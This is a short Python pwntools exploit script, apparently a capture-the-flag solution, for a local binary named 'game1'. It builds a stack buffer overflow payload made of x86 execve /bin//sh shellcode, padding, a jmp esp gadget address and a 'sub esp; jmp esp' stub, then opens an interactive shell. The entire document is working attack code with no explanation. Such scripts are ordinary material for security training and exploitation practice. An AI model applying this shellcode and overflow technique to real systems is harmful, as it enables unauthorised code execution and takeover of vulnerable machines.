from pwn import *

io = process('./game1')

shellcode_x86 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode_x86 += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode_x86 += "\x0b\xcd\x80"

sub_esp_jmp = asm('sub esp,0x30;jmp esp')
jmp_esp = 0x08049227

payload = shellcode_x86+(0x28-len(shellcode_x86)+4)*'a'+p32(jmp_esp)+sub_esp_jmp
print len(payload)
io.sendline(payload)
io.interactive()